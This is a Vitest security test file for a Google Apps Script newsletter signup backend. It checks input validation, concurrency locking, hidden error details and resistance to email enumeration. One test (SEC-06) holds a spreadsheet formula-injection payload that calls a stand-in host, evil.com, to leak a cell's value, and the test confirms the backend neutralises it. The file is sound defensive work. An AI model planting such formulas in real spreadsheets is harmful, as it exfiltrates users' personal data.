import { describe, it, expect, vi, beforeEach } from "vitest";
import { createRequire } from "node:module";

// Import du backend Google Apps Script durci
const require = createRequire(import.meta.url);
const gas = require("../../google_apps_script_newsletter.js");

type CellValue = string | number | boolean | null;

interface EmailPayload {
  to: string;
  subject: string;
  body: string;
  options: Record<string, unknown>;
}

function createMockEnvironment(options: {
  hasUsersSheet?: boolean;
  hasTemplateSheet?: boolean;
  initialUsersRows?: CellValue[][];
  initialTemplateRows?: CellValue[][];
  lockFails?: boolean;
  throwOnSpreadsheet?: boolean;
} = {}) {
  const {
    hasUsersSheet = true,
    hasTemplateSheet = true,
    initialUsersRows = [
      ["ID", "登録日時", "メールアドレス", "名前", "性別", "レベル", "興味のあるカテゴリー", "メール送信状況"]
    ],
    initialTemplateRows = [
      ["設定項目", "編集エリア", "説明"],
      ["送信者名", "Furago", "説明"],
      ["送信元エイリアス", "", "説明"],
      ["メールの件名", "【Furago】{{名前}}さん、ご登録ありがとうございます！", "説明"],
      ["メール内の見出しタイトル", "Bienvenue {{名前}} !", "説明"],
      ["メール本文", "Bonjour {{名前}}", "説明"],
      ["ボタンのテキスト", "Lire", "説明"],
      ["ボタンのリンク先URL", "https://furago.pages.dev", "説明"],
      ["署名・フッター", "Furago Team", "説明"]
    ],
    lockFails = false,
    throwOnSpreadsheet = false,
  } = options;

  const usersRows: CellValue[][] = initialUsersRows.map(r => [...r]);
  const templateRows: CellValue[][] = initialTemplateRows.map(r => [...r]);

  const usersSheet = hasUsersSheet ? {
    getName: () => "Users",
    getLastRow: () => usersRows.length,
    getMaxColumns: () => 8,
    getRange: (startRow: number, startCol: number, numRows: number, numCols: number) => ({
      getValue: () => {
        if (throwOnSpreadsheet) throw new Error("Internal Google Sheets Error at getRange");
        const row = usersRows[startRow - 1];
        return row ? row[startCol - 1] : null;
      },
      getValues: () => {
        if (throwOnSpreadsheet) throw new Error("Internal Google Sheets Error at getValues");
        const res: CellValue[][] = [];
        for (let r = 0; r < numRows; r++) {
          const rowData: CellValue[] = [];
          for (let c = 0; c < numCols; c++) {
            const row = usersRows[startRow - 1 + r];
            rowData.push(row ? row[startCol - 1 + c] : "");
          }
          res.push(rowData);
        }
        return res;
      },
      setValue: (val: CellValue) => {
        const targetRow = startRow - 1;
        if (!usersRows[targetRow]) usersRows[targetRow] = [];
        usersRows[targetRow][startCol - 1] = val;
      },
      setValues: (vals: CellValue[][]) => {
        for (let r = 0; r < vals.length; r++) {
          const targetRow = startRow - 1 + r;
          if (!usersRows[targetRow]) usersRows[targetRow] = [];
          for (let c = 0; c < vals[r].length; c++) {
            usersRows[targetRow][startCol - 1 + c] = vals[r][c];
          }
        }
      }
    }),
    appendRow: (row: CellValue[]) => {
      if (throwOnSpreadsheet) throw new Error("Internal Google Sheets Error at appendRow");
      usersRows.push([...row]);
    },
    deleteColumn: vi.fn(),
    insertSheet: vi.fn(),
    setFrozenRows: vi.fn(),
    setColumnWidth: vi.fn(),
    _getRows: () => usersRows,
  } : null;

  const templateSheet = hasTemplateSheet ? {
    getName: () => "EmailTemplate",
    getLastRow: () => templateRows.length,
    getRange: (startRow: number, startCol: number, numRows: number, numCols: number) => ({
      getValues: () => {
        const res: CellValue[][] = [];
        for (let r = 0; r < numRows; r++) {
          const rowData: CellValue[] = [];
          for (let c = 0; c < numCols; c++) {
            const row = templateRows[startRow - 1 + r];
            rowData.push(row ? row[startCol - 1 + c] : "");
          }
          res.push(rowData);
        }
        return res;
      }
    })
  } : null;

  const spreadsheet = {
    getSheetByName: (name: string) => {
      if (throwOnSpreadsheet) throw new Error("Internal Google Sheets Error at getSheetByName");
      if (name === "Users") return usersSheet;
      if (name === "EmailTemplate") return templateSheet;
      return null;
    },
    insertSheet: vi.fn(),
  };

  const lock = {
    tryLock: vi.fn(() => {
      if (lockFails) return false;
      return true;
    }),
    releaseLock: vi.fn(() => {}),
  };

  const sentEmails: EmailPayload[] = [];
  const cacheStore = new Map<string, string>();

  const services = {
    SpreadsheetApp: {
      getActiveSpreadsheet: () => (throwOnSpreadsheet ? (() => { throw new Error("Internal Sheets Crash"); })() : spreadsheet),
    },
    LockService: {
      getScriptLock: () => lock,
    },
    Utilities: {
      formatDate: () => "2026-10-07 17:00:00",
    },
    GmailApp: {
      sendEmail: vi.fn((to: string, subject: string, body: string, options: Record<string, unknown>) => {
        sentEmails.push({ to, subject, body, options });
      }),
    },
    CacheService: {
      getScriptCache: () => ({
        get: (key: string) => cacheStore.get(key) || null,
        put: (key: string, val: string) => cacheStore.set(key, val),
      }),
    },
    ContentService: {
      MimeType: { JSON: "application/json" },
      createTextOutput: (text: string) => {
        let mime = "text/plain";
        const output = {
          getContent: () => text,
          getMimeType: () => mime,
          setMimeType: (m: string) => { mime = m; return output; },
          raw: JSON.parse(text),
        };
        return output;
      },
    },
  };

  return {
    services,
    usersSheet,
    templateSheet,
    usersRows,
    sentEmails,
    lock,
  };
}

describe("Google Apps Script Newsletter Backend Security Suite (SEC-01 -> SEC-10)", () => {
  beforeEach(() => {
    vi.restoreAllMocks();
  });

  // SEC-01: Email valide accepté
  it("SEC-01: Email valide accepté lors d'une inscription ou vérification", () => {
    const env = createMockEnvironment();
    const event = {
      postData: {
        contents: JSON.stringify({
          email: "apprenant.valide@example.com",
          name: "Marie",
          level: "LVL_2",
          categories: ["Culture", "Société"],
        }),
      },
    };

    const response = gas.handleNewsletterPost(event, env.services);
    const parsed = response.raw;

    expect(parsed.status).toBe("ok");
    expect(parsed.userId).toBe("USR-0001");
    expect(env.usersRows.length).toBe(2); // Header + 1 user
    expect(env.usersRows[1][2]).toBe("apprenant.valide@example.com");
    expect(env.usersRows[1][3]).toBe("Marie");
  });

  // SEC-02: Email invalide refusé
  it("SEC-02: Email invalide refusé avec statut d'erreur contrôlé", () => {
    const invalidEmails = [
      "notanemail",
      "user@",
      "@domain.com",
      "user@domain",
      "",
      "   ",
      "a".repeat(255) + "@test.com",
    ];

    for (const invalidEmail of invalidEmails) {
      const env = createMockEnvironment();
      const event = {
        postData: {
          contents: JSON.stringify({
            email: invalidEmail,
            name: "Test",
          }),
        },
      };

      const response = gas.handleNewsletterPost(event, env.services);
      const parsed = response.raw;

      expect(parsed.status).toBe("error");
      expect(parsed.message).not.toContain("stack");
      expect(env.usersRows.length).toBe(1); // Seulement le header
    }
  });

  // SEC-03: Payload JSON invalide refusé proprement
  it("SEC-03: Payload JSON invalide refusé proprement sans exception non gérée", () => {
    const env = createMockEnvironment();
    const consoleErrorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
    const event = {
      postData: {
        contents: "{ unclosed json : true, ",
      },
    };

    const response = gas.handleNewsletterPost(event, env.services);
    const parsed = response.raw;

    expect(parsed.status).toBe("error");
    expect(parsed.message).toBe("Format JSON invalide.");
    expect(consoleErrorSpy).toHaveBeenCalled();
  });

  // SEC-04: Action inconnue refusée
  it("SEC-04: Action inconnue ou non autorisée refusée", () => {
    const env = createMockEnvironment();
    const event = {
      postData: {
        contents: JSON.stringify({
          action: "admin_dump_database",
          email: "legit@example.com",
        }),
      },
    };

    const response = gas.handleNewsletterPost(event, env.services);
    const parsed = response.raw;

    expect(parsed.status).toBe("error");
    expect(parsed.message).toBe("Action non autorisée.");
  });

  // SEC-05: Champs excessivement longs refusés
  it("SEC-05: Champs excessivement longs ou payload géant refusés", () => {
    // 1. Nom trop long (>100 chars)
    const env1 = createMockEnvironment();
    const event1 = {
      postData: {
        contents: JSON.stringify({
          email: "user@example.com",
          name: "A".repeat(101),
        }),
      },
    };
    const res1 = gas.handleNewsletterPost(event1, env1.services);
    expect(res1.raw.status).toBe("error");
    expect(res1.raw.message).toContain("longueur maximale");

    // 2. Payload trop grand (> 10KB)
    const env2 = createMockEnvironment();
    const event2 = {
      postData: {
        contents: JSON.stringify({
          email: "user@example.com",
          junk: "X".repeat(11000),
        }),
      },
    };
    const res2 = gas.handleNewsletterPost(event2, env2.services);
    expect(res2.raw.status).toBe("error");
    expect(res2.raw.message).toBe("Taille de requête excessive.");

    // 3. Catégories trop nombreuses (> 20)
    const env3 = createMockEnvironment();
    const event3 = {
      postData: {
        contents: JSON.stringify({
          email: "user@example.com",
          categories: Array(25).fill("Cat"),
        }),
      },
    };
    const res3 = gas.handleNewsletterPost(event3, env3.services);
    expect(res3.raw.status).toBe("error");
    expect(res3.raw.message).toContain("Nombre excessif");
  });

  // SEC-06: Entrée commençant par "=" neutralisée avant insertion Sheet (Formula Injection)
  it("SEC-06: Entrée commençant par '=' ou caractères formules neutralisée avec apostrophe", () => {
    const env = createMockEnvironment();
    const event = {
      postData: {
        contents: JSON.stringify({
          email: "hacker@example.com",
          name: "=HYPERLINK(\"http://evil.com/leak?\"&C2, \"Click Me\")",
          gender: "+evil_gender",
          categories: ["@dangerous_cat", "-negative"],
        }),
      },
    };

    const response = gas.handleNewsletterPost(event, env.services);
    expect(response.raw.status).toBe("ok");

    const insertedUser = env.usersRows[1];
    expect(insertedUser).toBeDefined();
    // Nom neutralisé
    expect(String(insertedUser?.[3]).startsWith("'=")).toBe(true);
    expect(insertedUser?.[3]).toBe("'=HYPERLINK(\"http://evil.com/leak?\"&C2, \"Click Me\")");
    // Genre neutralisé
    expect(String(insertedUser?.[4]).startsWith("'+")).toBe(true);
    // Catégories neutralisées
    expect(String(insertedUser?.[6]).startsWith("'@")).toBe(true);
  });

  // SEC-07: Deux inscriptions simultanées avec le même email -> une seule inscription finale
  it("SEC-07: Deux inscriptions simultanées avec le même email aboutissent à une seule insertion finale", () => {
    const env = createMockEnvironment();
    const email = "concurrency.test@example.com";

    const payload = JSON.stringify({
      email,
      name: "Taro",
      level: "LVL_1",
    });

    // 1ère requête
    const res1 = gas.handleNewsletterPost({ postData: { contents: payload } }, env.services);
    expect(res1.raw.status).toBe("ok");
    expect(res1.raw.userId).toBe("USR-0001");

    // 2ème requête identique (émulant concurrence arrivant sous le lock)
    const res2 = gas.handleNewsletterPost({ postData: { contents: payload } }, env.services);
    expect(res2.raw.status).toBe("already_exists");
    expect(res2.raw.message).toContain("既に登録されています");

    // Vérification du nombre d'inscriptions dans le Sheet : exactement 1 ligne utilisateur
    const userRegistrations = env.usersRows.filter(
      r => String(r[2]).trim().toLowerCase() === email
    );
    expect(userRegistrations.length).toBe(1);
    expect(env.lock.releaseLock).toHaveBeenCalled();
  });

  // SEC-08: Une erreur interne ne révèle aucun détail technique au client
  it("SEC-08: Une erreur interne ne révèle aucun détail technique ni stack trace", () => {
    const env = createMockEnvironment({ throwOnSpreadsheet: true });
    const event = {
      postData: {
        contents: JSON.stringify({
          email: "crash.test@example.com",
          name: "Test",
        }),
      },
    };

    // Espionner console.error pour s'assurer que l'erreur est bien loggée côté serveur
    const consoleErrorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    const response = gas.handleNewsletterPost(event, env.services);
    const parsed = response.raw;

    expect(parsed.status).toBe("error");
    expect(parsed.message).toBe("Une erreur est survenue. Veuillez réessayer.");
    // Aucune mention de ligne de code, crash interne ou stack
    expect(parsed.message).not.toContain("Crash");
    expect(parsed.message).not.toContain("Exception");
    expect(parsed.message).not.toContain("at ");
    expect(consoleErrorSpy).toHaveBeenCalled();
  });

  // SEC-09: Un backend mal initialisé ne lance pas une opération destructive depuis doPost
  it("SEC-09: Un backend mal initialisé (feuilles manquantes) ne lance pas setupDatabase depuis doPost", () => {
    const env = createMockEnvironment({ hasUsersSheet: false, hasTemplateSheet: false });
    const event = {
      postData: {
        contents: JSON.stringify({
          email: "normal@example.com",
          name: "Normal",
        }),
      },
    };

    const consoleErrorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    const response = gas.handleNewsletterPost(event, env.services);
    const parsed = response.raw;

    expect(parsed.status).toBe("error");
    expect(parsed.message).toBe("Une erreur est survenue. Veuillez réessayer.");
    // Vérifier que la feuille n'a pas été créée arbitrairement par doPost
    expect(env.services.SpreadsheetApp.getActiveSpreadsheet().insertSheet).not.toHaveBeenCalled();
    expect(consoleErrorSpy).toHaveBeenCalled();
  });

  // SEC-10: Flux normal newsletter inchangé
  it("SEC-10: Flux normal newsletter FuragoWeb fonctionne de bout en bout", () => {
    const env = createMockEnvironment();
    // Payload exact généré par FuragoApp.tsx à l'étape 3
    const frontendPayload = {
      email: "etudiant.japonais@furago.jp",
      name: "Kenji",
      firstName: "Kenji",
      gender: "Not specified",
      level: "LVL_1",
      categories: ["Société", "Culture"],
      source: "FuragoWeb",
    };

    const event = {
      postData: {
        contents: JSON.stringify(frontendPayload),
      },
    };

    const response = gas.handleNewsletterPost(event, env.services);
    const parsed = response.raw;

    expect(parsed.status).toBe("ok");
    expect(parsed.userId).toBe("USR-0001");

    // Données stockées dans Users
    const inserted = env.usersRows[1];
    expect(inserted[0]).toBe("USR-0001");
    expect(inserted[1]).toBe("2026-10-07 17:00:00");
    expect(inserted[2]).toBe("etudiant.japonais@furago.jp");
    expect(inserted[3]).toBe("Kenji");
    expect(inserted[4]).toBe("Not specified");
    expect(inserted[5]).toBe("LVL_1");
    expect(inserted[6]).toBe("Société、Culture");
    expect(String(inserted?.[7])).toContain("送信済み");

    // Email de bienvenue envoyé
    expect(env.sentEmails.length).toBe(1);
    expect(env.sentEmails[0].to).toBe("etudiant.japonais@furago.jp");
    expect(env.sentEmails[0].subject).toContain("Kenji");
  });

  // Bonus: Test de non-énumération sur doGet
  it("SEC-BONUS: doGet ne permet plus d'énumérer les emails enregistrés", () => {
    const env = createMockEnvironment();
    // Quelqu'un tente d'appeler GET /exec?email=victim@example.com
    const event = {
      parameter: {
        email: "victim@example.com",
      },
    };

    const response = gas.handleNewsletterGet(event, env.services);
    const parsed = response.raw;

    // Doit retourner uniquement le message de statut d'API, jamais "already_exists"
    expect(parsed.status).toBe("ok");
    expect(parsed.message).toBe("Furago Newsletter API is running");
    expect(parsed.status).not.toBe("already_exists");
    expect(parsed.status).not.toBe("available");
  });
});
